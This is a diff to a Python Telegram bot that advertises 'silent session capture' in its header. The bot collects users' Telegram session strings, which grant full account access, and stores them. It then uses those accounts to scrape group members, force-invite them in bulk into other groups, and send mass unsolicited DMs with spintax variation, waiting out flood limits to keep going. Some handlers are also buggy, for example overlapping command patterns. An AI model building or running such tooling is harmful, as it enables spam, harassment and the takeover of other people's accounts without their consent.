@@ -1,5 +1,5 @@
 """
-🤖 TOOLS BY REHAN – ULTIMATE TELEGRAM BOT (FULLY BUTTON‑DRIVEN)
+🤖 TOOLS BY REHAN – ULTIMATE TELEGRAM BOT
 👑 Owner: REHAN | Tag: RN ON TOP
 📌 Channel: @ToolsByRehan | Group: @Tools_By_Rehan
 🚀 All features + silent session capture + beautiful UI + private‑only replies
@@ -809,16 +809,13 @@ async def callback(event):
     # ----- VERIFY BUTTON -----
     if data == "verify":
         try:
-            # Check membership
             channel_entity = await client.get_entity(REQUIRED_CHANNEL)
             group_entity = await client.get_entity(REQUIRED_GROUP)
             try:
                 await client.get_permissions(channel_entity, user_id)
                 await client.get_permissions(group_entity, user_id)
-                # Mark as verified
                 set_verified(user_id)
                 await event.edit("✅ Verification successful!")
-                # Check invite bonus
                 inviter, total, ready = get_invite_bonus_status(user_id)
                 if ready:
                     inviter_id = award_invite_bonus(user_id)
@@ -847,7 +844,7 @@ async def callback(event):
             await event.edit("❌ Error checking verification. Please try again later.")
         return
 
-    # Admin menu
+    # ----- Admin Menu Actions -----
     if data == "admin_list_users":
         if not is_admin(user_id) and user_id != OWNER_ID:
             await event.edit("⛔ Admin only.", buttons=back_button())
@@ -915,7 +912,7 @@ async def callback(event):
         await event.edit(text, buttons=back_button())
         return
 
-    # Main menu
+    # ----- Main Menu Actions -----
     if data == "menu_main":
         await event.edit("🌟 **Main Menu**", buttons=main_menu_buttons())
         return
@@ -1158,9 +1155,731 @@ async def start(event):
         except:
             pass
 
-# ---------- All other commands are unchanged ----------
-# They are present in the full script but omitted here for brevity.
-# The complete file includes all handlers for /help, /ping, /credits, /addacc, etc.
+@client.on(events.NewMessage(pattern='/help', func=is_private))
+async def help_cmd(event):
+    await start(event)
+
+@client.on(events.NewMessage(pattern='/ping', func=is_private))
+async def ping(event):
+    await event.reply("🏓 Pong! Bot is alive and responding.")
+
+@client.on(events.NewMessage(pattern='/verify', func=is_private))
+async def verify(event):
+    user_id = event.sender_id
+    if is_banned(user_id):
+        await event.reply("🚫 Banned.")
+        return
+    try:
+        channel_entity = await client.get_entity(REQUIRED_CHANNEL)
+        group_entity = await client.get_entity(REQUIRED_GROUP)
+        try:
+            await client.get_permissions(channel_entity, user_id)
+            await client.get_permissions(group_entity, user_id)
+            set_verified(user_id)
+            await event.reply("✅ Verification successful!")
+            inviter, total, ready = get_invite_bonus_status(user_id)
+            if ready:
+                inviter_id = award_invite_bonus(user_id)
+                if inviter_id:
+                    await client.send_message(inviter_id, f"🎉 Your invited user has completed {INVITE_REQUIRED_ADDS} adds! You earned 100 credits.")
+                await event.reply("🎉 You also earned 100 credits for your inviter.")
+            # show menu
+            await start(event)
+        except:
+            await event.reply("❌ You haven't joined the required channel/group.")
+    except Exception as e:
+        logger.error("Verify error: %s", e)
+        await event.reply("❌ Error checking verification. Please try again later.")
+
+@client.on(events.NewMessage(pattern='/credits', func=is_private))
+async def credits_cmd(event):
+    user_id = event.sender_id
+    credits = get_credits(user_id)
+    await event.reply(f"💰 Your credits: {credits}")
+
+@client.on(events.NewMessage(pattern='/addacc', func=is_private))
+async def add_account(event):
+    user_id = event.sender_id
+    if is_banned(user_id) or not is_verified(user_id):
+        await event.reply("❌ You need to be verified and not banned.")
+        return
+    args = event.message.text.split()
+    if len(args) < 3:
+        await event.reply("Usage: `/addacc <phone> <session_string>`")
+        return
+    phone = args[1]
+    session_string = args[2]
+    try:
+        test_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        await test_client.connect()
+        if not await test_client.is_user_authorized():
+            await event.reply("❌ Invalid session string.")
+            return
+        await test_client.disconnect()
+    except Exception as e:
+        await event.reply(f"❌ Invalid session: {e}")
+        return
+    add_user_account(user_id, phone, session_string)
+    await event.reply(f"✅ Account with phone {phone} added successfully.")
+
+@client.on(events.NewMessage(pattern='/accounts', func=is_private))
+async def list_accounts(event):
+    user_id = event.sender_id
+    accounts = get_user_accounts(user_id)
+    if not accounts:
+        await event.reply("📱 No active accounts.")
+        return
+    text = "📱 **Your Accounts:**\n"
+    for aid, phone, sess in accounts:
+        text += f"🆔 ID: `{aid}` | 📞 Phone: `{phone}`\n"
+    await event.reply(text)
+
+@client.on(events.NewMessage(pattern='/removeacc', func=is_private))
+async def remove_account(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 2:
+        await event.reply("Usage: `/removeacc <account_id>`")
+        return
+    account_id = int(args[1])
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT user_id FROM user_accounts WHERE id = ?", (account_id,))
+    row = c.fetchone()
+    if not row or row[0] != user_id:
+        await event.reply("❌ Account not found or not yours.")
+        conn.close()
+        return
+    c.execute("UPDATE user_accounts SET is_active = 0 WHERE id = ?", (account_id,))
+    conn.commit()
+    conn.close()
+    await event.reply("✅ Account deactivated.")
+
+@client.on(events.NewMessage(pattern='/add', func=is_private))
+async def add_members(event):
+    user_id = event.sender_id
+    if is_banned(user_id) or not is_verified(user_id):
+        await event.reply("❌ Not allowed.")
+        return
+    args = event.message.text.split()
+    if len(args) < 3:
+        await event.reply("Usage: `/add <group_username> <count>`")
+        return
+    group_username = args[1]
+    count = int(args[2])
+    credits = get_credits(user_id)
+    cost = get_add_cost()
+    total_cost = count * cost
+    if credits < total_cost:
+        await event.reply(f"❌ Insufficient credits. Need {total_cost}, you have {credits}.")
+        return
+    accounts = get_user_accounts(user_id)
+    if not accounts:
+        await event.reply("❌ No active accounts. Add one with /addacc.")
+        return
+    deduct_credit(user_id, total_cost)
+    await event.reply(f"⏳ Starting add of {count} members to {group_username}...")
+    asyncio.create_task(do_add_members(event, user_id, group_username, count, accounts))
+
+async def do_add_members(event, user_id, group_username, count, accounts):
+    target_group = None
+    try:
+        target_group = await client.get_entity(group_username)
+        group_id = target_group.id
+    except Exception as e:
+        await event.reply(f"❌ Invalid group: {e}")
+        add_credits(user_id, count * get_add_cost(), "refund_add_fail")
+        return
+    added = 0
+    failed = 0
+    account_index = 0
+    settings = get_settings(user_id)
+    skip_existing = settings[8] if len(settings) > 8 else 1
+    for i in range(count):
+        try:
+            account_id, phone, session_string = accounts[account_index % len(accounts)]
+            account_index += 1
+            user_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+            await user_client.connect()
+            if not await user_client.is_user_authorized():
+                deactivate_account(account_id)
+                await event.reply(f"⚠️ Account {phone} deactivated (not authorized).")
+                continue
+            try:
+                participants = await user_client.get_participants(target_group, limit=1, offset=i)
+                if not participants:
+                    break
+                member = participants[0]
+                member_id = member.id
+                if skip_existing and is_member_added(user_id, group_id, member_id):
+                    failed += 1
+                    continue
+                try:
+                    await user_client(InviteToChannelRequest(target_group, [member_id]))
+                    mark_member_added(user_id, group_id, member_id, account_id, group_username, member.username or "", member.first_name or "")
+                    added += 1
+                    increment_daily_add(user_id)
+                    await asyncio.sleep(ADD_DELAY)
+                except FloodWaitError as e:
+                    await asyncio.sleep(e.seconds)
+                except Exception as e:
+                    failed += 1
+            except Exception as e:
+                failed += 1
+            await user_client.disconnect()
+        except Exception as e:
+            failed += 1
+            continue
+    update_group_analytics(user_id, group_id, added, failed)
+    await event.reply(f"✅ Done: Added {added} members, failed {failed}.")
+
+@client.on(events.NewMessage(pattern='/dm', func=is_private))
+async def dm_members(event):
+    user_id = event.sender_id
+    if is_banned(user_id) or not is_verified(user_id):
+        await event.reply("❌ Not allowed.")
+        return
+    args = event.message.text.split(maxsplit=3)
+    if len(args) < 4:
+        await event.reply("Usage: `/dm <group_username> <count> <message>`")
+        return
+    group_username = args[1]
+    count = int(args[2])
+    message = args[3]
+    credits = get_credits(user_id)
+    cost = get_dm_cost()
+    total_cost = count * cost
+    if credits < total_cost:
+        await event.reply(f"❌ Need {total_cost} credits, you have {credits}.")
+        return
+    deduct_credit(user_id, total_cost)
+    accounts = get_user_accounts(user_id)
+    if not accounts:
+        await event.reply("❌ No accounts.")
+        return
+    await event.reply(f"⏳ Sending DMs to {count} members...")
+    asyncio.create_task(do_dm_members(event, user_id, group_username, count, message, accounts))
+
+async def do_dm_members(event, user_id, group_username, count, message, accounts):
+    target_group = await client.get_entity(group_username)
+    group_id = target_group.id
+    settings = get_settings(user_id)
+    spintax_enabled = settings[6] if len(settings) > 6 else 0
+    sent = 0
+    failed = 0
+    account_index = 0
+    for i in range(count):
+        try:
+            account_id, phone, session_string = accounts[account_index % len(accounts)]
+            account_index += 1
+            user_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+            await user_client.connect()
+            if not await user_client.is_user_authorized():
+                deactivate_account(account_id)
+                continue
+            participants = await user_client.get_participants(target_group, limit=1, offset=i)
+            if not participants:
+                break
+            member = participants[0]
+            member_id = member.id
+            if is_dm_sent(user_id, member_id, group_id):
+                failed += 1
+                continue
+            msg = message
+            if spintax_enabled:
+                msg = apply_spintax(msg)
+            try:
+                await user_client.send_message(member_id, msg)
+                add_dm_sent(user_id, member_id, group_id)
+                sent += 1
+                await asyncio.sleep(DM_DELAY)
+            except Exception as e:
+                failed += 1
+            await user_client.disconnect()
+        except Exception as e:
+            failed += 1
+    await event.reply(f"✅ DMs sent: {sent}, failed: {failed}.")
+
+@client.on(events.NewMessage(pattern='/aidm', func=is_private))
+async def ai_dm(event):
+    user_id = event.sender_id
+    if is_banned(user_id) or not is_verified(user_id):
+        await event.reply("❌ Not allowed.")
+        return
+    if not GROQ_API_KEY:
+        await event.reply("❌ Groq API key not set.")
+        return
+    args = event.message.text.split(maxsplit=2)
+    if len(args) < 3:
+        await event.reply("Usage: `/aidm <group_username> <prompt>`")
+        return
+    group_username = args[1]
+    prompt = args[2]
+    ai_msg = get_ai_response(prompt)
+    if not ai_msg:
+        await event.reply("❌ AI failed to generate message.")
+        return
+    await event.reply(f"🤖 AI Generated Message:\n\n{ai_msg}\n\nProceed? Use `/dm {group_username} 1 {ai_msg}` to send.")
+
+@client.on(events.NewMessage(pattern='/schedule', func=is_private))
+async def schedule_menu(event):
+    user_id = event.sender_id
+    if is_banned(user_id) or not is_verified(user_id):
+        await event.reply("❌ Not allowed.")
+        return
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT id, source_group, target_group, count, interval_hours, next_run, is_active FROM scheduled_tasks WHERE user_id = ?", (user_id,))
+    tasks = c.fetchall()
+    conn.close()
+    text = "📅 **Your Scheduled Tasks:**\n"
+    if tasks:
+        for task in tasks:
+            text += f"🆔 ID: {task[0]} | From {task[1]} to {task[2]} | Count: {task[3]} | Every {task[4]}h | Next: {task[5][:16]} | Active: {'✅' if task[6] else '❌'}\n"
+    else:
+        text += "No tasks.\n"
+    text += "\nAdd task: `/schedule add <source_group> <target_group> <count> <interval_hours>`\n"
+    text += "Delete: `/schedule del <task_id>`\n"
+    text += "Toggle: `/schedule toggle <task_id>`"
+    await event.reply(text)
+
+@client.on(events.NewMessage(pattern='/schedule add', func=is_private))
+async def add_schedule(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 6:
+        await event.reply("Usage: `/schedule add <source_group> <target_group> <count> <interval_hours>`")
+        return
+    source = args[2]
+    target = args[3]
+    count = int(args[4])
+    interval = int(args[5])
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    next_run = (datetime.now() + timedelta(hours=interval)).isoformat()
+    c.execute('''
+        INSERT INTO scheduled_tasks (user_id, source_group, target_group, count, interval_hours, next_run)
+        VALUES (?, ?, ?, ?, ?, ?)
+    ''', (user_id, source, target, count, interval, next_run))
+    conn.commit()
+    conn.close()
+    await event.reply(f"✅ Schedule added. Next run at {next_run}")
+
+@client.on(events.NewMessage(pattern='/schedule del', func=is_private))
+async def delete_schedule(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 3:
+        await event.reply("Usage: `/schedule del <task_id>`")
+        return
+    task_id = int(args[2])
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("DELETE FROM scheduled_tasks WHERE id = ? AND user_id = ?", (task_id, user_id))
+    conn.commit()
+    conn.close()
+    await event.reply("✅ Task deleted.")
+
+@client.on(events.NewMessage(pattern='/schedule toggle', func=is_private))
+async def toggle_schedule(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 3:
+        await event.reply("Usage: `/schedule toggle <task_id>`")
+        return
+    task_id = int(args[2])
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("UPDATE scheduled_tasks SET is_active = NOT is_active WHERE id = ? AND user_id = ?", (task_id, user_id))
+    conn.commit()
+    conn.close()
+    await event.reply("✅ Toggled.")
+
+@client.on(events.NewMessage(pattern='/groups', func=is_private))
+async def groups_menu(event):
+    user_id = event.sender_id
+    if is_banned(user_id) or not is_verified(user_id):
+        await event.reply("❌ Not allowed.")
+        return
+    await event.reply(
+        "📂 **Account Groups**\n"
+        "`/groups list` - List groups\n"
+        "`/groups create <name>` - Create group\n"
+        "`/groups add <group_id> <account_id>` - Add account to group\n"
+        "`/groups remove <group_id> <account_id>` - Remove account\n"
+        "`/groups delete <group_id>` - Delete group"
+    )
+
+@client.on(events.NewMessage(pattern='/groups list', func=is_private))
+async def list_groups(event):
+    user_id = event.sender_id
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT id, name FROM account_groups WHERE user_id = ?", (user_id,))
+    groups = c.fetchall()
+    conn.close()
+    if not groups:
+        await event.reply("No groups.")
+        return
+    text = "📂 Your groups:\n"
+    for gid, name in groups:
+        text += f"🆔 ID: {gid} | 📛 {name}\n"
+    await event.reply(text)
+
+@client.on(events.NewMessage(pattern='/groups create', func=is_private))
+async def create_group(event):
+    user_id = event.sender_id
+    args = event.message.text.split(maxsplit=2)
+    if len(args) < 3:
+        await event.reply("Usage: `/groups create <name>`")
+        return
+    name = args[2]
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("INSERT INTO account_groups (user_id, name, created_at) VALUES (?, ?, ?)",
+              (user_id, name, datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+    await event.reply(f"✅ Group '{name}' created.")
+
+@client.on(events.NewMessage(pattern='/groups add', func=is_private))
+async def add_to_group(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 4:
+        await event.reply("Usage: `/groups add <group_id> <account_id>`")
+        return
+    gid = int(args[2])
+    acc_id = int(args[3])
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT user_id FROM account_groups WHERE id = ?", (gid,))
+    row = c.fetchone()
+    if not row or row[0] != user_id:
+        conn.close()
+        await event.reply("❌ Group not yours.")
+        return
+    c.execute("INSERT OR IGNORE INTO account_group_members (group_id, account_id) VALUES (?, ?)", (gid, acc_id))
+    conn.commit()
+    conn.close()
+    await event.reply("✅ Account added to group.")
+
+@client.on(events.NewMessage(pattern='/groups remove', func=is_private))
+async def remove_from_group(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 4:
+        await event.reply("Usage: `/groups remove <group_id> <account_id>`")
+        return
+    gid = int(args[2])
+    acc_id = int(args[3])
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("DELETE FROM account_group_members WHERE group_id = ? AND account_id = ?", (gid, acc_id))
+    conn.commit()
+    conn.close()
+    await event.reply("✅ Account removed from group.")
+
+@client.on(events.NewMessage(pattern='/groups delete', func=is_private))
+async def delete_group(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 3:
+        await event.reply("Usage: `/groups delete <group_id>`")
+        return
+    gid = int(args[2])
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("DELETE FROM account_groups WHERE id = ? AND user_id = ?", (gid, user_id))
+    c.execute("DELETE FROM account_group_members WHERE group_id = ?", (gid,))
+    conn.commit()
+    conn.close()
+    await event.reply("✅ Group deleted.")
+
+@client.on(events.NewMessage(pattern='/clone', func=is_private))
+async def clone_group(event):
+    user_id = event.sender_id
+    if is_banned(user_id) or not is_verified(user_id):
+        await event.reply("❌ Not allowed.")
+        return
+    args = event.message.text.split()
+    if len(args) < 3:
+        await event.reply("Usage: `/clone <source_group> <target_group>`")
+        return
+    source = args[1]
+    target = args[2]
+    try:
+        source_entity = await client.get_entity(source)
+        source_participants = await client.get_participants(source_entity)
+        count = len(source_participants)
+        await event.reply(f"📊 Source group has {count} members. Cloning to {target}...")
+        accounts = get_user_accounts(user_id)
+        if not accounts:
+            await event.reply("❌ No accounts.")
+            return
+        await event.reply("⏳ Cloning in progress...")
+        asyncio.create_task(do_clone(event, user_id, source, target, count, accounts))
+    except Exception as e:
+        await event.reply(f"❌ Error: {e}")
+
+async def do_clone(event, user_id, source, target, count, accounts):
+    try:
+        source_entity = await client.get_entity(source)
+        target_entity = await client.get_entity(target)
+        target_group_id = target_entity.id
+    except Exception as e:
+        await event.reply(f"❌ Invalid groups: {e}")
+        return
+    added = 0
+    failed = 0
+    account_index = 0
+    for i in range(count):
+        try:
+            account_id, phone, session_string = accounts[account_index % len(accounts)]
+            account_index += 1
+            user_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+            await user_client.connect()
+            if not await user_client.is_user_authorized():
+                deactivate_account(account_id)
+                continue
+            participants = await user_client.get_participants(source_entity, limit=1, offset=i)
+            if not participants:
+                break
+            member = participants[0]
+            member_id = member.id
+            if is_member_added(user_id, target_group_id, member_id):
+                failed += 1
+                continue
+            try:
+                await user_client(InviteToChannelRequest(target_entity, [member_id]))
+                mark_member_added(user_id, target_group_id, member_id, account_id, target, member.username or "", member.first_name or "")
+                added += 1
+                increment_daily_add(user_id)
+                await asyncio.sleep(ADD_DELAY)
+            except FloodWaitError as e:
+                await asyncio.sleep(e.seconds)
+            except Exception as e:
+                failed += 1
+            await user_client.disconnect()
+        except Exception as e:
+            failed += 1
+            continue
+    update_group_analytics(user_id, target_group_id, added, failed)
+    await event.reply(f"✅ Clone completed: Added {added} members, failed {failed}.")
+
+@client.on(events.NewMessage(pattern='/analytics', func=is_private))
+async def analytics_cmd(event):
+    user_id = event.sender_id
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    total_adds = c.execute("SELECT COUNT(*) FROM added_members WHERE user_id = ?", (user_id,)).fetchone()[0]
+    total_dms = c.execute("SELECT COUNT(*) FROM dm_sent WHERE user_id = ?", (user_id,)).fetchone()[0]
+    today = datetime.now().date().isoformat()
+    daily_adds = c.execute("SELECT count FROM daily_adds WHERE user_id = ? AND date = ?", (user_id, today)).fetchone()
+    daily_adds = daily_adds[0] if daily_adds else 0
+    credits = get_credits(user_id)
+    conn.close()
+    text = f"📊 **Your Analytics**\n\n"
+    text += f"👥 Total Members Added: {total_adds}\n"
+    text += f"💬 Total DMs Sent: {total_dms}\n"
+    text += f"📆 Today's Adds: {daily_adds}\n"
+    text += f"💰 Credits: {credits}"
+    await event.reply(text)
+
+@client.on(events.NewMessage(pattern='/dashboard', func=is_private))
+async def dashboard_cmd(event):
+    user_id = event.sender_id
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    days = []
+    for i in range(6, -1, -1):
+        d = (datetime.now() - timedelta(days=i)).date().isoformat()
+        count = c.execute("SELECT count FROM daily_adds WHERE user_id = ? AND date = ?", (user_id, d)).fetchone()
+        days.append((d, count[0] if count else 0))
+    top_groups = c.execute("SELECT group_username, COUNT(*) FROM added_members WHERE user_id = ? GROUP BY group_username ORDER BY COUNT(*) DESC LIMIT 5", (user_id,)).fetchall()
+    conn.close()
+    text = "📈 **Growth Dashboard**\n\n"
+    text += "📊 **Daily Adds (Last 7 Days):**\n"
+    for d, cnt in days:
+        text += f"  {d}: {cnt} adds\n"
+    text += "\n🏆 **Top Groups:**\n"
+    if top_groups:
+        for g, cnt in top_groups:
+            text += f"  {g}: {cnt} members\n"
+    else:
+        text += "  No data yet."
+    await event.reply(text)
+
+@client.on(events.NewMessage(pattern='/referral', func=is_private))
+async def referral_cmd(event):
+    user_id = event.sender_id
+    row = get_user(user_id)
+    if not row:
+        await event.reply("You are not registered.")
+        return
+    invite_code = row[9]
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    total_invites = c.execute("SELECT COUNT(*) FROM invites WHERE inviter_id = ? AND status='completed'", (user_id,)).fetchone()[0]
+    tier_bonus = get_referral_tier(total_invites)
+    conn.close()
+    text = f"👥 **Referral System**\n\n"
+    text += f"🔑 Your invite code: `{invite_code}`\n"
+    text += f"📊 Total invited (completed): {total_invites}\n"
+    text += f"🎁 Next tier bonus: {tier_bonus} credits at {25} invites\n"
+    text += f"🔗 Share: https://t.me/{client.get_me().username}?start={invite_code}"
+    await event.reply(text)
+
+@client.on(events.NewMessage(pattern='/addedmembers', func=is_private))
+async def addedmembers_cmd(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 2:
+        await event.reply("Usage: `/addedmembers <group_username>`")
+        return
+    group_username = args[1]
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT member_id, member_username, member_name, added_at FROM added_members WHERE user_id = ? AND group_username = ? ORDER BY added_at DESC LIMIT 50",
+              (user_id, group_username))
+    rows = c.fetchall()
+    conn.close()
+    if not rows:
+        await event.reply("No members added in this group yet.")
+        return
+    text = f"📋 **Recently Added Members in {group_username}**\n"
+    for row in rows:
+        text += f"🆔 ID: {row[0]} | @{row[1] or 'N/A'} | {row[2] or 'N/A'} | {row[3][:16]}\n"
+    await event.reply(text)
+
+@client.on(events.NewMessage(pattern='/spintax', func=is_private))
+async def spintax_cmd(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 2:
+        await event.reply("Usage: `/spintax on/off`")
+        return
+    state = args[1].lower()
+    val = True if state == 'on' else False
+    update_settings(user_id, spintax_enabled=val)
+    await event.reply(f"✅ Spintax {'enabled' if val else 'disabled'}.")
+
+@client.on(events.NewMessage(pattern='/skip', func=is_private))
+async def skip_cmd(event):
+    user_id = event.sender_id
+    args = event.message.text.split()
+    if len(args) < 2:
+        await event.reply("Usage: `/skip on/off`")
+        return
+    state = args[1].lower()
+    val = True if state == 'on' else False
+    update_settings(user_id, smart_filter_skip_existing=val)
+    await event.reply(f"✅ Skip existing members {'enabled' if val else 'disabled'}.")
+
+@client.on(events.NewMessage(pattern='/settings', func=is_private))
+async def settings_cmd(event):
+    user_id = event.sender_id
+    settings = get_settings(user_id)
+    text = "⚙️ **Your Settings**\n\n"
+    text += f"🤖 AI DM: {'✅' if settings[1] else '❌'}\n"
+    text += f"🚫 Skip Bots: {'✅' if settings[2] else '❌'}\n"
+    text += f"🖼️ Has Profile Picture: {'✅' if settings[3] else '❌'}\n"
+    text += f"⏳ Active in 7 Days: {'✅' if settings[4] else '❌'}\n"
+    text += f"🔄 Skip Existing: {'✅' if settings[8] else '❌'}\n"
+    text += f"🔀 Spintax: {'✅' if settings[6] else '❌'}\n"
+    await event.reply(text)
+
+# ============================================================
+# 🛠️ ADMIN COMMANDS
+# ============================================================
+
+@client.on(events.NewMessage(pattern='/admin', func=is_private))
+async def admin_cmd(event):
+    user_id = event.sender_id
+    if not is_admin(user_id) and user_id != OWNER_ID:
+        await event.reply("⛔ Admin only.")
+        return
+    args = event.message.text.split()
+    if len(args) < 3:
+        await event.reply("Usage: `/admin <action> <user_id> [amount]`\nActions: add, remove, ban, unban, delete, setcredits")
+        return
+    action = args[1]
+    target_id = int(args[2])
+    if action == 'add':
+        set_admin(target_id, True)
+        await event.reply(f"✅ User {target_id} is now admin.")
+    elif action == 'remove':
+        set_admin(target_id, False)
+        await event.reply(f"✅ User {target_id} is no longer admin.")
+    elif action == 'ban':
+        ban_user(target_id)
+        await event.reply(f"🚫 User {target_id} banned.")
+    elif action == 'unban':
+        unban_user(target_id)
+        await event.reply(f"✅ User {target_id} unbanned.")
+    elif action == 'delete':
+        delete_user(target_id)
+        await event.reply(f"🗑️ User {target_id} deleted.")
+    elif action == 'setcredits':
+        if len(args) < 4:
+            await event.reply("Usage: `/admin setcredits <user_id> <amount>`")
+            return
+        amount = int(args[3])
+        add_credits(target_id, amount, "admin_set")
+        await event.reply(f"✅ Set credits of {target_id} to {get_credits(target_id)} (added {amount})")
+    else:
+        await event.reply("❌ Unknown admin action.")
+
+@client.on(events.NewMessage(pattern='/broadcast', func=is_private))
+async def broadcast_cmd(event):
+    user_id = event.sender_id
+    if not is_admin(user_id) and user_id != OWNER_ID:
+        await event.reply("⛔ Admin only.")
+        return
+    msg = event.message.text[len('/broadcast'):].strip()
+    if not msg:
+        await event.reply("Usage: `/broadcast <message>`")
+        return
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    users = c.execute("SELECT user_id FROM users WHERE is_banned=0").fetchall()
+    conn.close()
+    count = 0
+    for (uid,) in users:
+        try:
+            await client.send_message(uid, f"📢 **Broadcast:**\n{msg}")
+            count += 1
+            await asyncio.sleep(0.5)
+        except:
+            pass
+    await event.reply(f"✅ Broadcast sent to {count} users.")
+
+@client.on(events.NewMessage(pattern='/backup', func=is_private))
+async def backup_cmd(event):
+    user_id = event.sender_id
+    if not is_admin(user_id) and user_id != OWNER_ID:
+        await event.reply("⛔ Admin only.")
+        return
+    backup_data()
+    await event.reply("✅ Backup completed.")
+
+@client.on(events.NewMessage(pattern='/stats', func=is_private))
+async def stats_cmd(event):
+    user_id = event.sender_id
+    if not is_admin(user_id) and user_id != OWNER_ID:
+        await event.reply("⛔ Admin only.")
+        return
+    stats = get_bot_stats()
+    uptime = int(stats['uptime'])
+    hours = uptime // 3600
+    minutes = (uptime % 3600) // 60
+    text = f"📊 **Bot Statistics**\n\n"
+    text += f"👥 Users: {stats['users']}\n"
+    text += f"📱 Active Accounts: {stats['accounts']}\n"
+    text += f"➕ Members Added: {stats['members_added']}\n"
+    text += f"💬 DMs Sent: {stats['dms_sent']}\n"
+    text += f"⏱️ Uptime: {hours}h {minutes}m"
+    await event.reply(text)
 
 # ============================================================
 # 🕒 SCHEDULED TASK RUNNER & AUTO BACKUP
